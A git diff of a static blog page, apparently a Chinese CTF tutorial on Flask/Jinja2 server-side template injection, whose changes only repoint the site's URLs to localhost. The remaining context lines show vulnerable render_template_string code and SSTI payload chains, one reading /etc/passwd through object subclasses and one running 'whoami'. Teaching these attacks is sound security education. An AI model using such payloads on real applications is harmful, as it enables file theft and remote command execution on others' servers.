@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>Python Flask SSTI模板注入 |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="Python Flask SSTI模板注入 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="Python Flask SSTI模板注入 |   » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="Python Flask SSTI模板注入"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/EeULI1N2K/"/>
+    <meta property="og:url" content="http://localhost:4000/post/EeULI1N2K/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <a class="navbar-brand" href="http://localhost:4000"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>Python Flask SSTI模板注入</h1>
@@ -122,7 +122,7 @@ def test():
 #启动服务，绑定0.0.0.0的80端口
 app.run('0.0.0.0',80)
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1577953469825.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1577953469825.png" alt="" loading="lazy"></figure>
 <pre><code>from flask import *
 #导入模块
 app=Flask(__name__)
@@ -135,7 +135,7 @@ def test(username):
 #启动服务，绑定0.0.0.0的80端口
 app.run('0.0.0.0',80)
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://guokeya.github.io/post-images/1577953486818.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1577953486818.png" alt="" loading="lazy"></figure>
 <p>模板渲染：</p>
 <pre><code>flask是使用jinja2渲染引擎，渲染方法有render_template和render_template_string两种，前者是用来渲染文件的，后来则是渲染字符串，SSTI就和字符串有关
 文件格式：
@@ -157,7 +157,7 @@ app.run('0.0.0.0',80)
 #当访问/的时候，渲染引擎就会将content对应的值，放入html模板中
 #{{}}是变量包裹标识符，不仅可以传递变量，还能传递一些简单的表达式
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://guokeya.github.io/post-images/1577953513566.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="http://localhost:4000/post-images/1577953513566.png" alt="" loading="lazy"></figure>
 <pre><code>接下来就要开始动态的字符串渲染了。开始SSTI
 from flask import *
 app=Flask(__name__)
@@ -171,14 +171,14 @@ def test():
     #渲染输出
 app.run('0.0.0.0',80)
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1577953526804.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1577953526804.png" alt="" loading="lazy"><br>
 我们输出恶意的JS代码时，它也会原样输出<br>
-<img src="https://guokeya.github.io/post-images/1577953539408.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1577953539408.png" alt="" loading="lazy"></p>
 <pre><code>这段代码的危害，可不止XSS
 之前讲了，在{{}}，可以输入一些表达式，{{2*4}}会输出8
 当输出{{config}}时，就会输出flask的全局变量
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="https://guokeya.github.io/post-images/1577953557936.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="http://localhost:4000/post-images/1577953557936.png" alt="" loading="lazy"></figure>
 <pre><code>在python中，object类是python中所有类的基类，定义一个类时，没指定继承哪个类，则默认继承object类,ssti大部分都是依靠基类-&gt;子类-&gt;危险函数来利用
 下面开始介绍什么是类。什么是基类等。
 __class__
@@ -196,21 +196,21 @@ __globals__
 </code></pre>
 <p><code>[].__class__</code><br>
 返回了&lt;type 'list'&gt;,对于一个列表，它利用class来返回类，list类，而每个类都有一个bases属性，列出基类，这些都不重要，我们的目标是，通过这些，获得object类<br>
-<img src="https://guokeya.github.io/post-images/1577953591762.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1577953591762.png" alt="" loading="lazy"><br>
 <code>[].__class__.__bases__</code><br>
 返回了(&lt;type 'object'&gt;,),对于一个list，用bases返回基类，成功获取到object类，这里是以元组输出的,[0]才是object<br>
-<img src="https://guokeya.github.io/post-images/1577953598219.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1577953598219.png" alt="" loading="lazy"><br>
 <code>[].__class__.__mro__</code><br>
 我们也可以用mro来返回object,mro会返回两个<br>
-<img src="https://guokeya.github.io/post-images/1577953618171.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1577953618171.png" alt="" loading="lazy"><br>
 <code>[].__class__.__bases__[0].__subclasses__()</code><br>
 我们使用subclasses这个方法来返回类的子类，也就是object类子类的集合，里面包含了file，os等子类，调用即可执行命令等<br>
-<img src="https://guokeya.github.io/post-images/1577953642015.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1577953642015.png" alt="" loading="lazy"><br>
 <code>[].__class__.__bases__[0].__subclasses__()[40]</code><br>
 这里调用了第40个子类，返回的file<br>
 <code>[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()</code><br>
 相当于file('/etc/passwd').read()<br>
-<img src="https://guokeya.github.io/post-images/1577953665008.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1577953665008.png" alt="" loading="lazy"><br>
 <strong>Python2</strong></p>
 <pre><code>                                命令执行
 [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']].__dict__.values()[12].__dict__.values()[144]('whoami')
@@ -255,7 +255,7 @@ for i in ''.__class__.__mro__[2].__subclasses__():
         pass
     num+=1
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1577953728850.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1577953728850.png" alt="" loading="lazy"><br>
 下面介绍下过滤某些字符的绕过</p>
 <pre><code>[]
 用__gititem__绕过
@@ -291,7 +291,7 @@ https://www.freebuf.com/column/187845.html</p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/jjD9b5sxT/">
+            <a href="http://localhost:4000/post/jjD9b5sxT/">
               <span class="post-title">
                 PHP mt_rand 随机数安全&rarr;
               </span>
@@ -335,7 +335,7 @@ https://www.freebuf.com/column/187845.html</p>
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -350,10 +350,10 @@ https://www.freebuf.com/column/187845.html</p>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
